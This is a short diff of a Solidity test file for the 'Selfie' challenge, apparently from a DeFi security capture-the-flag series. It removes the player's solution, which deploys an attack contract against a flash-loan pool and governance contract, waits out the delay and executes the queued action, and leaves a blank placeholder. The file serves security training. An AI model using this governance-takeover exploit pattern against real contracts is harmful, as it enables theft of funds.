@@ -63,19 +63,7 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        AttackSelfie attacker = new AttackSelfie(
-            address(pool),
-            address(governance),
-            address(token),
-            player
-        );
-
-        attacker.attack();
-
-        uint256 ACTION_DELAY = 2 days + 1 seconds;
-        vm.warp(block.timestamp + ACTION_DELAY);
-
-        governance.executeAction(1);
+        
     }
 
     /**
